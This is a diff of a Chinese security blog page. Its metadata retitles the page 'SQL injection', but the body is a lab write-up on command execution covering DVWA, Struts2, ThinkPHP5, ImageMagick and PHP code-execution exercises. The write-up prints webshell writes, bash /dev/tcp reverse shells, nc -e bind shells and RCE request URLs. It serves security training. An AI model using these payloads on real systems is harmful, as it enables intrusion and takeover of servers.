@@ -22,53 +22,53 @@
 
   <meta name="description" content="命令执行实验gwolfs [toc]  1. 命令执行漏洞（1）实验介绍 实验链接： http:&#x2F;&#x2F;www.hetianlab.com&#x2F;expc.do?ce&#x3D;39594afc-5c80-4d51-8f99-7cb54e20b401  实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。  （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然">
 <meta property="og:type" content="article">
-<meta property="og:title" content="合天培训_实验_命令执行">
-<meta property="og:url" content="http://blog.ydq6.com/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="合天培训_实验_sql注入">
+<meta property="og:url" content="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="gwolfs的个人博客">
 <meta property="og:description" content="命令执行实验gwolfs [toc]  1. 命令执行漏洞（1）实验介绍 实验链接： http:&#x2F;&#x2F;www.hetianlab.com&#x2F;expc.do?ce&#x3D;39594afc-5c80-4d51-8f99-7cb54e20b401  实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。  （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426123935628.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426124613975.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125031831.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125304313.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125326981.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426130010047.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426130102921.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426141646790.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144136346.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144439093.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144235821.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426165939722.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426171311315.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426172341563.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426133832110.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426140144644.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426140329896.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426173713380.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426174407176.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426174750306.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426175011326.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426175113764.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181415386.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181654848.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181922754.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426182118419.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426182340785.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183223748.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183515204.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183623281.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426185546367.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426185648640.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426190132905.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426190529727.png">
-<meta property="article:published_time" content="2020-05-01T08:53:17.000Z">
-<meta property="article:modified_time" content="2020-05-01T08:53:47.255Z">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426123935628-1588323655195.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426124613975-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125031831-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125304313-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426125326981-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426130010047-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426130102921-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426141646790-1588323655196.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144136346-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144439093-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426144235821-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426165939722-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426171311315-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426172341563-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426133832110-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426140144644-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426140329896-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426173713380-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426174407176-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426174750306-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426175011326-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426175113764-1588323655197.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181415386-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181654848-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426181922754-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426182118419-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426182340785-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183223748-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183515204-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426183623281-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426185546367-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426185648640-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426190132905-1588323655198.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200426190529727-1588323655198.png">
+<meta property="article:published_time" content="2020-05-01T09:00:13.000Z">
+<meta property="article:modified_time" content="2020-05-01T09:02:02.456Z">
 <meta property="article:author" content="gwolfs">
-<meta property="article:tag" content="web安全 SGX">
+<meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20200426123935628.png">
+<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20200426123935628-1588323655195.png">
 
-<link rel="canonical" href="http://blog.ydq6.com/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-sql%E6%B3%A8%E5%85%A5/">
 
 
 <script id="page-configurations">
@@ -81,7 +81,7 @@
   };
 </script>
 
-  <title>合天培训_实验_命令执行 | gwolfs的个人博客</title>
+  <title>合天培训_实验_sql注入 | gwolfs的个人博客</title>
   
 
 
@@ -201,7 +201,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-sql%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -214,7 +214,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          合天培训_实验_命令执行
+          合天培训_实验_sql注入
         </h1>
 
         <div class="post-meta">
@@ -225,7 +225,16 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-05-01 16:53:17 / 修改时间：16:53:47" itemprop="dateCreated datePublished" datetime="2020-05-01T16:53:17+08:00">2020-05-01</time>
+              <time title="创建时间：2020-05-01 17:00:13 / 修改时间：17:02:02" itemprop="dateCreated datePublished" datetime="2020-05-01T17:00:13+08:00">2020-05-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
             </span>
 
           
@@ -250,33 +259,33 @@
 <p>1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。</p>
 <p>2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。</p>
 <p>尝试127.0.0.1</p>
-<p><img src="/assets/image-20200426123935628.png" alt="image-20200426123935628"></p>
+<p><img src="/assets/image-20200426123935628-1588323655195.png" alt="image-20200426123935628"></p>
 <p>3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。</p>
 <p>4）构造payload</p>
 <ul>
 <li><p>127.0.0.1 | net user          查看用户</p>
-<p><img src="/assets/image-20200426124613975.png" alt="image-20200426124613975"></p>
+<p><img src="/assets/image-20200426124613975-1588323655196.png" alt="image-20200426124613975"></p>
 </li>
 <li><p>127.0.0.1 | echo “<?php phpinfo; ?>“ &gt; 1.php        写php文件</p>
 </li>
 </ul>
-<p><img src="/assets/image-20200426125031831.png" alt="image-20200426125031831"></p>
+<p><img src="/assets/image-20200426125031831-1588323655196.png" alt="image-20200426125031831"></p>
 <ul>
 <li>127.0.0.1 | echo “<?php @eval($_POST['cmd']); ?>“ &gt; shell.php 写shell</li>
 </ul>
 <p>用菜刀连接</p>
-<p><img src="/assets/image-20200426125304313.png" alt="image-20200426125304313"></p>
-<p><img src="/assets/image-20200426125326981.png" alt="image-20200426125326981"></p>
+<p><img src="/assets/image-20200426125304313-1588323655196.png" alt="image-20200426125304313"></p>
+<p><img src="/assets/image-20200426125326981-1588323655196.png" alt="image-20200426125326981"></p>
 <p>由于实验机里没有nc工具就不尝试反弹shell了。</p>
 <p>5)medium难度操作</p>
 <p>通过fuzz发现&amp;&amp;和;被过滤了。</p>
 <ul>
 <li>127.0.0.1;dir</li>
 </ul>
-<p><img src="/assets/image-20200426130010047.png" alt="image-20200426130010047"></p>
+<p><img src="/assets/image-20200426130010047-1588323655196.png" alt="image-20200426130010047"></p>
 <ul>
 <li><p>127.0.0.1 &amp;&amp; dir</p>
-<p><img src="/assets/image-20200426130102921.png" alt="image-20200426130102921"></p>
+<p><img src="/assets/image-20200426130102921-1588323655196.png" alt="image-20200426130102921"></p>
 </li>
 </ul>
 <p>但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的|</p>
@@ -294,7 +303,7 @@
 <p>2）正常业务</p>
 <p>点击edit，随便输入内容提交，成功提交。</p>
 <p>3）poc测试</p>
-<p><img src="/assets/image-20200426141646790.png" alt="image-20200426141646790"></p>
+<p><img src="/assets/image-20200426141646790-1588323655196.png" alt="image-20200426141646790"></p>
 <p>发现报错500，rce成功。而且弹出了计算器。</p>
 <p>4）漏洞分析</p>
 <p>XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。</p>
@@ -322,16 +331,16 @@
 </ul>
 <p>2）实验操作</p>
 <p>直接利用实验里带的ThinkPHP5漏洞检测工具。</p>
-<p><img src="/assets/image-20200426144136346.png" alt="image-20200426144136346"></p>
+<p><img src="/assets/image-20200426144136346-1588323655197.png" alt="image-20200426144136346"></p>
 <p>发现poc。</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request\<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>
 
 
 
 <p>测试</p>
-<p><img src="/assets/image-20200426144439093.png" alt="image-20200426144439093"></p>
+<p><img src="/assets/image-20200426144439093-1588323655197.png" alt="image-20200426144439093"></p>
 <p>发现正确。然后getshell.</p>
-<p><img src="/assets/image-20200426144235821.png" alt="image-20200426144235821"></p>
+<p><img src="/assets/image-20200426144235821-1588323655197.png" alt="image-20200426144235821"></p>
 <p>3）漏洞分析</p>
 <p>a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自<code>$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]</code>，所以可以通过控制输入的参数s来控制pathinfo.</p>
 <p>b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。</p>
@@ -346,7 +355,7 @@
 <p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p>
 <p>（2）实验操作</p>
 <p>1）检查ImageMagick版本</p>
-<p><img src="/assets/image-20200426165939722.png" alt="image-20200426165939722"></p>
+<p><img src="/assets/image-20200426165939722-1588323655197.png" alt="image-20200426165939722"></p>
 <p>版本号为6.8.9.</p>
 <p>2）漏洞测试</p>
 <p>创建exploit.png,其内容为：</p>
@@ -358,7 +367,7 @@
 <p>可以发现成功执行了ls -a命令。证明存在命令执行漏洞。</p>
 <p>3）漏洞利用</p>
 <p>在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。</p>
-<p><img src="/assets/image-20200426171311315.png" alt="image-20200426171311315"></p>
+<p><img src="/assets/image-20200426171311315-1588323655197.png" alt="image-20200426171311315"></p>
 <p>发现是用的ImageMagick工具转换的。</p>
 <p>先下载 nc，并在本地开启监听。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -nvlp <span class="number">12301</span></span><br></pre></td></tr></table></figure>
@@ -369,7 +378,7 @@
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1"</span>)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 
 <p>上传后shell反弹成功。</p>
-<p><img src="/assets/image-20200426172341563.png" alt="image-20200426172341563"></p>
+<p><img src="/assets/image-20200426172341563-1588323655197.png" alt="image-20200426172341563"></p>
 <p>4）漏洞分析</p>
 <p>ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为：</p>
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure>
@@ -381,7 +390,7 @@
 <p>有回显。</p>
 <p>（2）fuzz测试。</p>
 <p>首先抓包</p>
-<p><img src="/assets/image-20200426133832110.png" alt="image-20200426133832110"></p>
+<p><img src="/assets/image-20200426133832110-1588323655197.png" alt="image-20200426133832110"></p>
 <p>发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>],<span class="variable">$return</span>);<span class="built_in">echo</span> <span class="variable">$return</span>;</span><br><span class="line"><span class="built_in">echo</span> system(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br></pre></td></tr></table></figure>
 
@@ -389,9 +398,9 @@
 <p>（3）由于没有任何过滤所以直接写shell。</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ipaddress</span>=127.0.0.1 | echo <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['cmd']); ?&gt;"</span> &gt; shell.php &amp; <span class="attribute">submit</span>=ping</span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426140144644.png" alt="image-20200426140144644"></p>
+<p><img src="/assets/image-20200426140144644-1588323655197.png" alt="image-20200426140144644"></p>
 <p>尝试连接：</p>
-<p><img src="/assets/image-20200426140329896.png" alt="image-20200426140329896"></p>
+<p><img src="/assets/image-20200426140329896-1588323655197.png" alt="image-20200426140329896"></p>
 <p>发现失败，估计没有写的权限。</p>
 <p>（4）尝试shell</p>
 <p>a.正向shell</p>
@@ -401,7 +410,7 @@
 <p>本机</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426173713380.png" alt="image-20200426173713380"></p>
+<p><img src="/assets/image-20200426173713380-1588323655197.png" alt="image-20200426173713380"></p>
 <p>正向shell成功。</p>
 <p>b.反弹shell</p>
 <p>本机(自己的服务器)：</p>
@@ -414,10 +423,10 @@
 <p>换台服务器尝试</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p>
+<p><img src="/assets/image-20200426174407176-1588323655197.png" alt="image-20200426174407176"></p>
 <p>反弹shell成功。</p>
 <h3 id="B-rce-ping-2"><a href="#B-rce-ping-2" class="headerlink" title="B.rce_ping_2"></a>B.rce_ping_2</h3><p>直接fuzz测试。</p>
-<p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p>
+<p><img src="/assets/image-20200426174750306-1588323655197.png" alt="image-20200426174750306"></p>
 <p>发现<code>; &amp;&amp;</code>被过滤了。</p>
 <p>直接正向shell测试。</p>
 <p>服务器</p>
@@ -426,9 +435,9 @@
 <p>本机</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p>
+<p><img src="/assets/image-20200426175011326-1588323655197.png" alt="image-20200426175011326"></p>
 <h3 id="c-rce-ping-3"><a href="#c-rce-ping-3" class="headerlink" title="c.rce_ping_3"></a>c.rce_ping_3</h3><p>同样fuzz测试。</p>
-<p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p>
+<p><img src="/assets/image-20200426175113764-1588323655197.png" alt="image-20200426175113764"></p>
 <p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p>
 <h3 id="D-rce-ping-4"><a href="#D-rce-ping-4" class="headerlink" title="D.rce_ping_4"></a>D.rce_ping_4</h3><p>页面500</p>
 <h3 id="E-code"><a href="#E-code" class="headerlink" title="E.code"></a>E.code</h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
@@ -441,12 +450,12 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">func</span>=system&amp;echo <span class="string">"&lt;?php <span class="variable">$_POST</span>[pass]&gt; ?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
 
 <p>发现还是不能上传shell???这里想探究下。</p>
-<p><img src="/assets/image-20200426181415386.png" alt="image-20200426181415386"></p>
+<p><img src="/assets/image-20200426181415386-1588323655198.png" alt="image-20200426181415386"></p>
 <p>当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。</p>
 <p>(3)反弹shell。</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7781 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p>
+<p><img src="/assets/image-20200426181654848-1588323655198.png" alt="image-20200426181654848"></p>
 <p>反弹成功。</p>
 <h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map"></a>b. array_map</h4><p>array_map原型</p>
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure>
@@ -454,14 +463,14 @@
 <p>同样直接</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p>
+<p><img src="/assets/image-20200426181922754-1588323655198.png" alt="image-20200426181922754"></p>
 <h4 id="c-assert"><a href="#c-assert" class="headerlink" title="c.assert"></a>c.assert</h4><p>assert原型</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure>
 
 <p>payload:</p>
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p>
+<p><img src="/assets/image-20200426182118419-1588323655198.png" alt="image-20200426182118419"></p>
 <h4 id="d-call-user-func"><a href="#d-call-user-func" class="headerlink" title="d.call_user_func"></a>d.call_user_func</h4><p>函数原型</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure>
 
@@ -471,7 +480,7 @@
 <p>payload:</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p>
+<p><img src="/assets/image-20200426182340785-1588323655198.png" alt="image-20200426182340785"></p>
 <h4 id="e-create-func"><a href="#e-create-func" class="headerlink" title="e.create_func"></a>e.create_func</h4><p>create_function ( string $args , string $code )</p>
 <p>同样payload:</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
@@ -484,16 +493,16 @@
 <p>连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>1 -e /bin/bash');</span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p>
+<p><img src="/assets/image-20200426183223748-1588323655198.png" alt="image-20200426183223748"></p>
 <p>成功反弹shell。</p>
 <h4 id="g-preg-replace"><a href="#g-preg-replace" class="headerlink" title="g preg_replace"></a>g preg_replace</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>
 
 <p>直接cmd=phpinfo();</p>
-<p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p>
+<p><img src="/assets/image-20200426183515204-1588323655198.png" alt="image-20200426183515204"></p>
 <p>反弹shell。</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p>
+<p><img src="/assets/image-20200426183623281-1588323655198.png" alt="image-20200426183623281"></p>
 <h4 id="h-preg-replace2"><a href="#h-preg-replace2" class="headerlink" title="h preg_replace2"></a>h preg_replace2</h4><p>可以在双引号中使用</p>
 <figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -530,8 +539,8 @@
 </li>
 </ul>
 <h3 id="G-ThinkPHP-V5框架漏洞"><a href="#G-ThinkPHP-V5框架漏洞" class="headerlink" title="G.ThinkPHP V5框架漏洞"></a>G.ThinkPHP V5框架漏洞</h3><p>首先用dirsearch扫描，</p>
-<p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p>
-<p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p>
+<p><img src="/assets/image-20200426185546367-1588323655198.png" alt="image-20200426185546367"></p>
+<p><img src="/assets/image-20200426185648640-1588323655198.png" alt="image-20200426185648640"></p>
 <p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p>
 <p>可以用云悉探测。</p>
 <p>搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围：</p>
@@ -545,14 +554,14 @@
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>
 
 <p>利用成功</p>
-<p><img src="/assets/image-20200426190132905.png" alt="image-20200426190132905"></p>
+<p><img src="/assets/image-20200426190132905-1588323655198.png" alt="image-20200426190132905"></p>
 <p>正确写shell姿势</p>
